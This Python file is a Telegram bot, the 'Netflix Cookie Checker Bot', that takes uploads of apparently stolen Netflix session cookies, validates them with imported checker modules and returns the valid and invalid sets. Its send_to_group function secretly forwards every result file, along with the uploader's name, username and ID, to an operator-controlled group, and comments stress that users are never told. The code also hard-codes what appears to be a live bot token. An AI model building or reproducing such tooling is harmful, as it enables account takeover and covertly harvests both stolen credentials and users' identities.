
import os
import asyncio
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from uuid import uuid4
import shutil
import zipfile
from datetime import datetime
import signal
import sys

# Import the correct functions from your checker files
from Fastcheck import process_file_and_check as fast_check
from Slowcheck import process_file_and_check as slow_check
from Logout import process_file_and_check as logout_check

# --- Config ---
TOKEN = "8340045274:AAHGNYpVIGh8B4myxDOan4_CiNqlqwQbEC4"  # Replace with your actual bot token
UPLOAD_DIR = "uploads"

# Group configuration - Add your group chat ID here (HIDDEN FROM USERS)
TARGET_GROUP_ID = "-1001234567890"  # Replace with your group chat ID (include the minus sign)
SEND_TO_GROUP = True  # Set to False to disable group sending

# Global dictionary to track active processes
active_processes = {}
# Global stop flag for emergency stop
global_stop_flag = False

# Ensure directories exist
os.makedirs(UPLOAD_DIR, exist_ok=True)

# --- Helper: Save uploaded files ---
async def save_uploaded_file(file, file_unique_id, file_name):
    safe_name = f"{file_unique_id}_{file_name}"
    file_path = os.path.join(UPLOAD_DIR, safe_name)
    await file.download_to_drive(file_path)
    return file_path

# --- Helper: Clean up old files ---
def cleanup_directory(directory):
    """Remove all files from a directory"""
    if os.path.exists(directory):
        try:
            shutil.rmtree(directory)
        except Exception as e:
            print(f"Error removing directory {directory}: {e}")

# --- Helper: Detect check mode from filename ---
def detect_check_mode(filename):
    """Detect checking mode from filename"""
    filename_lower = filename.lower()
    
    # Check for specific keywords in filename
    if any(keyword in filename_lower for keyword in ['fast', 'quick', 'rapid']):
        return 'fast'
    elif any(keyword in filename_lower for keyword in ['slow', 'thorough', 'deep', 'full']):
        return 'slow'
    elif any(keyword in filename_lower for keyword in ['logout', 'signout', 'exit']):
        return 'logout'
    else:
        # Default to fast if no specific mode detected
        return 'fast'

# --- Helper: Create ZIP file from cookies (ENHANCED for both valid and invalid) ---
def create_results_zip(results_dir, mode, original_filename, result_type="valid"):
    """Create a ZIP file containing valid or invalid cookies"""
    if result_type == "valid":
        target_dir = os.path.join(results_dir, 'valid_cookies')
    else:
        target_dir = os.path.join(results_dir, 'invalid_cookies')
    
    if not os.path.exists(target_dir) or not os.listdir(target_dir):
        return None
    
    # Create zip filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_name = os.path.splitext(original_filename)[0]
    zip_filename = f"{base_name}_{mode}_{result_type}_{timestamp}.zip"
    zip_path = os.path.join(results_dir, zip_filename)
    
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename in os.listdir(target_dir):
                file_path = os.path.join(target_dir, filename)
                if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
                    zipf.write(file_path, filename)
        
        # Check if zip file was created and has content
        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
            return zip_path
        else:
            return None
            
    except Exception as e:
        print(f"Error creating {result_type} ZIP file: {e}")
        return None

# --- Helper: Send results to group (SILENT - HIDDEN FROM USERS) ---
async def send_to_group(context, file_path, filename, file_type, original_filename, user_info, mode):
    """Send results to the target group - COMPLETELY SILENT"""
    if not SEND_TO_GROUP or not TARGET_GROUP_ID:
        return
    
    try:
        # Get file size
        file_size = os.path.getsize(file_path)
        file_size_mb = file_size / (1024 * 1024)
        
        # Create caption with user info
        username_str = f"@{user_info.get('username')}" if user_info.get('username') else "No username"
        last_name_str = user_info.get('last_name', '') or ''
        
        caption = f"""{'✅ VALID' if file_type == 'valid' else '❌ INVALID'} Cookies

👤 User: {user_info['first_name']} {last_name_str}
🔗 Username: {username_str}
🆔 ID: {user_info['id']}
📁 Original: {original_filename}
🔍 Mode: {mode.upper()}
📊 Size: {file_size_mb:.2f} MB"""
        
        # Send to group SILENTLY
        with open(file_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=TARGET_GROUP_ID,
                document=f,
                filename=filename,
                caption=caption,
                parse_mode='Markdown'
            )
            
        # Silent logging - no user notification
        print(f"[SILENT] Sent {file_type} results to group: {filename}")
            
    except Exception as e:
        # Silent error handling - no user notification
        print(f"[SILENT] Error sending to group: {e}")

# --- Helper: Create inline keyboard with valid/invalid counts and STOP button ---
def create_status_keyboard(valid, invalid, process_id):
    """Create inline keyboard with valid/invalid counts and STOP button"""
    keyboard = [
        [
            InlineKeyboardButton(f"✅ Valid: {valid}", callback_data=f"stats_valid_{process_id}"),
            InlineKeyboardButton(f"❌ Invalid: {invalid}", callback_data=f"stats_invalid_{process_id}")
        ],
        [
            InlineKeyboardButton("🛑 STOP PROCESS", callback_data=f"stop_process_{process_id}")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Helper: Format processing status ---
def format_processing_status(checked, total, valid, invalid, elapsed_time, mode):
    """Format processing status message with progress indicators"""
    progress_percent = (checked / total * 100) if total > 0 else 0
    
    # Progress bar (20 characters)
    filled_blocks = int(progress_percent / 5)
    progress_bar = "█" * filled_blocks + "░" * (20 - filled_blocks)
    
    # Calculate speed
    speed = checked / elapsed_time if elapsed_time > 0 else 0
    
    # Calculate ETA
    remaining = total - checked
    eta = remaining / speed if speed > 0 else 0
    eta_str = f"{int(eta // 60)}m {int(eta % 60)}s" if eta < 3600 else f"{int(eta // 3600)}h {int((eta % 3600) // 60)}m"
    
    status_msg = f"""📊 **Processing Status**

📂 Processing: {checked}/{total}
📈 Progress: {progress_percent:.1f}%
{progress_bar}

⚡ Speed: {speed:.1f} files/sec
⏱️ Elapsed: {int(elapsed_time // 60)}m {int(elapsed_time % 60)}s
🕐 ETA: {eta_str if eta > 0 else '--'}"""
    
    return status_msg

# --- Emergency stop function ---
def emergency_stop():
    """Stop all active processes immediately"""
    global global_stop_flag, active_processes
    global_stop_flag = True
    
    # Set stop flag for all active processes
    for process_id in active_processes:
        active_processes[process_id]["stop_flag"] = True
    
    print("🛑 EMERGENCY STOP: All processes halted")

# --- Callback handler for inline buttons (ENHANCED with emergency stop) ---
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button callbacks"""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    
    if callback_data.startswith("stop_process_"):
        process_id = callback_data.split("_")[-1]
        
        # Set stop flag for the specific process
        if process_id in active_processes:
            active_processes[process_id]["stop_flag"] = True
            
            # Also set global stop flag to halt checker functions
            global global_stop_flag
            global_stop_flag = True
            
            # Update message to show process stopped
            await query.edit_message_text(
                "🛑 **Process Stopped**\n\n"
                "The checking process has been stopped by user request.\n"
                "All running operations have been halted.",
                parse_mode='Markdown'
            )
            
            print(f"🛑 Process {process_id} stopped by user")
        else:
            await query.edit_message_text(
                "⚠️ **Process Not Found**\n\n"
                "The process may have already completed or stopped.",
                parse_mode='Markdown'
            )
    
    elif callback_data.startswith("stats_"):
        # These are just display buttons, no action needed
        pass

# --- Helper: Process file with specific mode (ENHANCED with SILENT group sending) ---
async def process_file_with_mode(update, context, file_path, file_name, mode, reply_to_message=None):
    """Process a file with the specified checking mode"""
    global global_stop_flag
    
    # Reset global stop flag for new process
    global_stop_flag = False
    
    # Generate unique process ID
    process_id = str(uuid4())[:8]
    
    # Initialize process tracking
    active_processes[process_id] = {
        "stop_flag": False,
        "file_name": file_name,
        "mode": mode
    }
    
    # Send initial processing message with inline keyboard
    initial_keyboard = create_status_keyboard(0, 0, process_id)
    
    if reply_to_message:
        status_msg = await reply_to_message.reply_text(
            f"🔄 **Starting {mode.upper()} check...**\n"
            f"📁 File: `{file_name}`\n"
            f"⏳ Initializing...",
            parse_mode='Markdown',
            reply_markup=initial_keyboard
        )
    else:
        status_msg = await update.message.reply_text(
            f"🔄 **Starting {mode.upper()} check...**\n"
            f"📁 File: `{file_name}`\n"
            f"⏳ Initializing...",
            parse_mode='Markdown',
            reply_markup=initial_keyboard
        )

    try:
        # Start timing
        start_time = asyncio.get_event_loop().time()
        loop = asyncio.get_event_loop()

        # Shared progress state
        progress = {"checked": 0, "total": 0, "valid": 0, "invalid": 0}
        results_dir = None

        # --- updater task for live editing ---
        async def update_status():
            while True:
                try:
                    # Check if process should stop
                    if (active_processes.get(process_id, {}).get("stop_flag", False) or 
                        global_stop_flag):
                        break
                        
                    elapsed = asyncio.get_event_loop().time() - start_time
                    status_text = format_processing_status(
                        progress["checked"],
                        progress["total"],
                        progress["valid"],
                        progress["invalid"],
                        elapsed,
                        mode
                    )
                    
                    # Create updated keyboard with current counts
                    keyboard = create_status_keyboard(
                        progress["valid"], 
                        progress["invalid"], 
                        process_id
                    )
                    
                    await status_msg.edit_text(
                        status_text, 
                        parse_mode='Markdown',
                        reply_markup=keyboard
                    )
                    await asyncio.sleep(2)
                except Exception:
                    break

        status_task = asyncio.create_task(update_status())

        # --- wrapper to run checkers that yield progress ---
        def run_check(func, file_path):
            nonlocal results_dir
            try:
                for step in func(file_path, live=True):
                    # Check stop flags during processing
                    if (active_processes.get(process_id, {}).get("stop_flag", False) or 
                        global_stop_flag):
                        print(f"🛑 Breaking check loop for process {process_id}")
                        break
                        
                    if len(step) == 4:
                        checked, total, valid, invalid = step
                        progress["checked"] = checked
                        progress["total"] = total
                        progress["valid"] = valid
                        progress["invalid"] = invalid
                    elif len(step) == 5:
                        checked, total, valid, invalid, results_dir = step
                        progress["checked"] = checked
                        progress["total"] = total
                        progress["valid"] = valid
                        progress["invalid"] = invalid
            except Exception as e:
                print(f"Error in run_check: {e}")
            return results_dir

        # Run actual check depending on mode
        if mode == 'fast':
            results_dir = await loop.run_in_executor(None, run_check, fast_check, file_path)
        elif mode == 'slow':
            # This line will now call the process_file_and_check from your new Slowcheck.py
            results_dir = await loop.run_in_executor(None, run_check, slow_check, file_path)
        elif mode == 'logout':
            results_dir = await loop.run_in_executor(None, run_check, logout_check, file_path)
    
        # Stop updater
        status_task.cancel()

        # Check if process was stopped
        if (active_processes.get(process_id, {}).get("stop_flag", False) or 
            global_stop_flag):
            # Clean up and exit
            if results_dir and os.path.exists(results_dir):
                cleanup_directory(results_dir)
            if os.path.exists(file_path):
                os.remove(file_path)
            
            # Remove from active processes
            active_processes.pop(process_id, None)
            return

        # --- Enhanced results sending logic (send to user + SILENTLY to group) ---
        sent_files = 0
        total_size = 0
        
        # Get user info for SILENT group sending
        user_info = {
            'id': update.effective_user.id,
            'first_name': update.effective_user.first_name,
            'last_name': update.effective_user.last_name,
            'username': update.effective_user.username
        }
        
        if results_dir and os.path.exists(results_dir):
            # Check for valid cookies directory
            valid_dir = os.path.join(results_dir, 'valid_cookies')
            invalid_dir = os.path.join(results_dir, 'invalid_cookies')
            
            valid_files = []
            invalid_files = []
            
            if os.path.exists(valid_dir):
                valid_files = [f for f in os.listdir(valid_dir) 
                             if os.path.isfile(os.path.join(valid_dir, f)) and 
                             os.path.getsize(os.path.join(valid_dir, f)) > 0]
            
            if os.path.exists(invalid_dir):
                invalid_files = [f for f in os.listdir(invalid_dir) 
                               if os.path.isfile(os.path.join(invalid_dir, f)) and 
                               os.path.getsize(os.path.join(invalid_dir, f)) > 0]
            
            # Determine if original was an archive or single file
            file_ext = os.path.splitext(file_name)[1].lower()
            is_archive = file_ext in ['.zip', '.rar']
            
            # For archives or when there are many files, create ZIP files
            if is_archive or len(valid_files) > 3 or len(invalid_files) > 3:
                
                # Create and send VALID ZIP if there are valid cookies
                if valid_files:
                    valid_zip_path = create_results_zip(results_dir, mode, file_name, "valid")
                    if valid_zip_path:
                        zip_size = os.path.getsize(valid_zip_path)
                        
                        # Send to user
                        with open(valid_zip_path, 'rb') as f:
                            await update.message.reply_document(
                                document=f,
                                filename=os.path.basename(valid_zip_path),
                                caption=f"✅ **Valid Cookies** ({len(valid_files)} files)\n📁 From: `{file_name}`",
                                parse_mode='Markdown'
                            )
                        
                        # SILENTLY send to group (user doesn't know)
                        asyncio.create_task(send_to_group(
                            context, 
                            valid_zip_path, 
                            os.path.basename(valid_zip_path), 
                            "valid", 
                            file_name, 
                            user_info, 
                            mode
                        ))
                        
                        sent_files += 1
                        total_size += zip_size
                
                # Create and send INVALID ZIP if there are invalid cookies
                if invalid_files:
                    invalid_zip_path = create_results_zip(results_dir, mode, file_name, "invalid")
                    if invalid_zip_path:
                        zip_size = os.path.getsize(invalid_zip_path)
                        
                        # Send to user
                        with open(invalid_zip_path, 'rb') as f:
                            await update.message.reply_document(
                                document=f,
                                filename=os.path.basename(invalid_zip_path),
                                caption=f"❌ **Invalid Cookies** ({len(invalid_files)} files)\n📁 From: `{file_name}`",
                                parse_mode='Markdown'
                            )
                        
                        # SILENTLY send to group (user doesn't know)
                        asyncio.create_task(send_to_group(
                            context, 
                            invalid_zip_path, 
                            os.path.basename(invalid_zip_path), 
                            "invalid", 
                            file_name, 
                            user_info, 
                            mode
                        ))
                        
                        sent_files += 1
                        total_size += zip_size
                
                # If no ZIP files were created
                if sent_files == 0:
                    await update.message.reply_text("❌ Error creating results archives.")
            
            else:
                # Send individual files for single file uploads with few results
                
                # Send valid files individually
                for filename in valid_files:
                    file_path_result = os.path.join(valid_dir, filename)
                    try:
                        file_size = os.path.getsize(file_path_result)
                        
                        # Send to user
                        with open(file_path_result, 'rb') as f:
                            await update.message.reply_document(
                                document=f,
                                filename=filename,
                                caption="✅ **Valid Cookie**",
                                parse_mode='Markdown'
                            )
                        
                        # SILENTLY send to group (user doesn't know)
                        asyncio.create_task(send_to_group(
                            context, 
                            file_path_result, 
                            filename, 
                            "valid", 
                            file_name, 
                            user_info, 
                            mode
                        ))
                        
                        sent_files += 1
                        total_size += file_size
                    except Exception as e:
                        print(f"Error sending valid file {filename}: {e}")
                
                # Send invalid files individually
                for filename in invalid_files:
                    file_path_result = os.path.join(invalid_dir, filename)
                    try:
                        file_size = os.path.getsize(file_path_result)
                        
                        # Send to user
                        with open(file_path_result, 'rb') as f:
                            await update.message.reply_document(
                                document=f,
                                filename=filename,
                                caption="❌ **Invalid Cookie**",
                                parse_mode='Markdown'
                            )
                        
                        # SILENTLY send to group (user doesn't know)
                        asyncio.create_task(send_to_group(
                            context, 
                            file_path_result, 
                            filename, 
                            "invalid", 
                            file_name, 
                            user_info, 
                            mode
                        ))
                        
                        sent_files += 1
                        total_size += file_size
                    except Exception as e:
                        print(f"Error sending invalid file {filename}: {e}")

        # Delete the processing status message to keep conversation clean
        try:
            await status_msg.delete()
        except Exception:
            pass

        # Send completion summary (NO mention of group sending)
        if sent_files == 0:
            summary_msg = await update.message.reply_text(
                f"📊 **Processing Complete**\n"
                f"📁 File: `{file_name}`\n"
                f"🔍 Mode: {mode.upper()} check\n\n"
                f"✅ Valid: {progress['valid']}\n"
                f"❌ Invalid: {progress['invalid']}\n"
                f"📦 Total Processed: {progress['checked']}\n\n"
                f"ℹ️ No result files to send (all cookies may have been empty or corrupted)",
                parse_mode='Markdown'
            )
            # Delete summary after 15 seconds
            await asyncio.sleep(15)
            try:
                await summary_msg.delete()
            except Exception:
                pass
        else:
            # Send a completion summary (NO mention of group sending)
            summary_msg = await update.message.reply_text(
                f"🎉 **Processing Complete!**\n"
                f"📁 File: `{file_name}`\n"
                f"🔍 Mode: {mode.upper()} check\n\n"
                f"✅ Valid: {progress['valid']}\n"
                f"❌ Invalid: {progress['invalid']}\n"
                f"📦 Total Processed: {progress['checked']}\n"
                f"📤 Files Sent: {sent_files}",
                parse_mode='Markdown'
            )
            # Delete summary after 10 seconds
            await asyncio.sleep(10)
            try:
                await summary_msg.delete()
            except Exception:
                pass

        # Clean up result directory (after a delay to allow group sending)
        await asyncio.sleep(3)  # Wait for group sending to complete
        if results_dir and os.path.exists(results_dir):
            cleanup_directory(results_dir)
            
        # Clean up uploaded file
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            print(f"Error cleaning up uploaded file: {e}")

        # Remove from active processes
        active_processes.pop(process_id, None)

    except Exception as e:
        # Delete processing message and show error
        try:
            await status_msg.delete()
        except Exception:
            pass
        
        error_msg = await update.message.reply_text(
            f"❌ **Error during {mode.upper()} check**\n"
            f"`{str(e)}`",
            parse_mode='Markdown'
        )
        # Delete error message after 15 seconds
        await asyncio.sleep(15)
        try:
            await error_msg.delete()
        except Exception:
            pass
        
        # Remove from active processes
        active_processes.pop(process_id, None)

# --- Command: /start (NO mention of group functionality) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """🍿 **Netflix Cookie Checker Bot**

📋 **How to use:**

• `/fastcheck` - Quick validation
• `/slowcheck` - Thorough validation  
• `/logout` - Logout check

Just send me a file or reply to one with a command!
    """
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

# --- Handle commands with replies ---
async def handle_command_reply(update: Update, context: ContextTypes.DEFAULT_TYPE, mode: str):
    """Handle commands that are replies to files"""
    
    if not update.message.reply_to_message:
        temp_msg = await update.message.reply_text(
            f"💡 **{mode.upper()} Check**\n\n"
            f"To use this command:\n"
            f"1. Send me a file, OR\n"
            f"2. Reply to a file with `/{mode}check`\n\n"
            f"I'll process it with {mode} checking mode!",
            parse_mode='Markdown'
        )
        # Delete instruction message after 10 seconds
        await asyncio.sleep(10)
        try:
            await temp_msg.delete()
            await update.message.delete()
        except Exception:
            pass
        return
    
    replied_message = update.message.reply_to_message
    
    # Check if the replied message has a document
    if replied_message.document:
        try:
            # Download the file from the reply
            tg_file = await replied_message.document.get_file()
            file_path = await save_uploaded_file(
                tg_file, 
                replied_message.document.file_unique_id, 
                replied_message.document.file_name
            )
            
            # Delete the command message to keep conversation clean
            try:
                await update.message.delete()
            except Exception:
                pass
            
            # Process the file with the specified mode
            await process_file_with_mode(
                update, 
                context,
                file_path, 
                replied_message.document.file_name, 
                mode,
                reply_to_message=replied_message
            )
            
        except Exception as e:
            temp_msg = await update.message.reply_text(
                f"❌ Error processing replied file: {str(e)}"
            )
            await asyncio.sleep(10)
            try:
                await temp_msg.delete()
                await update.message.delete()
            except Exception:
                pass
    else:
        temp_msg = await update.message.reply_text(
            f"⚠️ Please reply to a **file** with `/{mode}check` command.\n\n"
            f"The message you replied to doesn't contain a file."
        )
        await asyncio.sleep(10)
        try:
            await temp_msg.delete()
            await update.message.delete()
        except Exception:
            pass

# --- Auto-process files ---
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if doc:
        # Check file size (limit to 50MB for archives)
        if doc.file_size > 50 * 1024 * 1024:
            temp_msg = await update.message.reply_text("❌ File too large. Please send files smaller than 50MB.")
            await asyncio.sleep(10)
            try:
                await temp_msg.delete()
            except Exception:
                pass
            return
            
        try:
            # Detect check mode from filename
            mode = detect_check_mode(doc.file_name)
            
            # Save the file
            tg_file = await doc.get_file()
            file_path = await save_uploaded_file(
                tg_file, doc.file_unique_id, doc.file_name
            )
            
            # Process the file automatically without confirmation message
            await process_file_with_mode(update, context, file_path, doc.file_name, mode)
            
        except Exception as e:
            temp_msg = await update.message.reply_text(f"❌ Error processing file: {str(e)}")
            await asyncio.sleep(10)
            try:
                await temp_msg.delete()
            except Exception:
                pass
    else:
        temp_msg = await update.message.reply_text("⚠️ Please send a valid document file (.txt, .zip, .rar)")
        await asyncio.sleep(5)
        try:
            await temp_msg.delete()
        except Exception:
            pass

# --- Command handlers ---
async def fastcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_command_reply(update, context, 'fast')

async def slowcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_command_reply(update, context, 'slow')

async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_command_reply(update, context, 'logout')

# --- Error handler ---
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")

# --- Signal handler for graceful shutdown ---
def signal_handler(signum, frame):
    """Handle system signals for graceful shutdown"""
    print(f"\n🛑 Received signal {signum}. Stopping all processes...")
    emergency_stop()
    sys.exit(0)

# --- Main Application ---
def main():
    print("🤖 Initializing Netflix Cookie Checker Bot...")
    
    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    app = ApplicationBuilder().token(TOKEN).build()

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("fastcheck", fastcheck))
    app.add_handler(CommandHandler("slowcheck", slowcheck))
    app.add_handler(CommandHandler("logout", logout))
    app.add_handler(CallbackQueryHandler(button_callback))  # Add callback handler for inline buttons
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    # Add error handler
    app.add_error_handler(error_handler)

    print("✅ Bot is running and ready to receive files...")
    print("🔍 Features:")
    print("   • Auto-detection from filename")
    print("   • Reply to files with commands")
    print("   • Reply to results for rechecking")
    print("   • Clean conversation mode")
    print("   • Inline buttons for valid/invalid counts")
    print("   • STOP button to halt ALL processing")
    print("   • Both valid AND invalid results sent back")
    print("   • [SILENT] Group forwarding enabled")
    print("🗂️ Archive support: ZIP/RAR files supported")
    print("🛑 Emergency stop: Ctrl+C to stop all processes")
    
    # Silent logging about group configuration
    if SEND_TO_GROUP and TARGET_GROUP_ID:
        print(f"📋 [SILENT] Group forwarding to: {TARGET_GROUP_ID}")
    else:
        print("⚠️ [SILENT] Group forwarding disabled or not configured")
    
    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
        emergency_stop()
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        emergency_stop()

if __name__ == '__main__':
    main()

